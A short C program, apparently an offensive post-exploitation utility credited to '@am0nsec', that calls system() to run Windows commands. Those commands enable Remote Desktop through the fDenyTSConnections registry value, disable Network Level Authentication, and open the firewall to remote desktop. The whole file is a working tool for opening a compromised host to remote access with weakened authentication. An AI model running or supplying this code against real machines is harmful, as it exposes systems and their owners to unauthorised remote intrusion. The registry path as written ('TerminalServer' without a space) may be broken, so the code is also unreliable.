#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main () {

  printf("[*] Add regstry key to enable RDP");
  printf("\n[*] and disable both network level authentication");
  printf("\n[*] and firewall exception.");
  printf("\n[*] Author: @am0nsec");

  printf("\n\n[*] Start RDP");
  system("reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\TerminalServer\" /V fDenyTSConnections /t REG_DWORD /D 0 /f");

  printf("\n[*] Disable Network LEvel Authentication");
  system("reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\TerminalServer\\WinStations\\RDP-Tcp\" /v UserAuthentication /t REG_DWORD /d \"0\" /f");

  printf("\n[*] Disable firewall exception");
  system("netsh firewall set service type = remotedesktop mode = enable");

  printf("\n[*] Down.");
  return 0;
}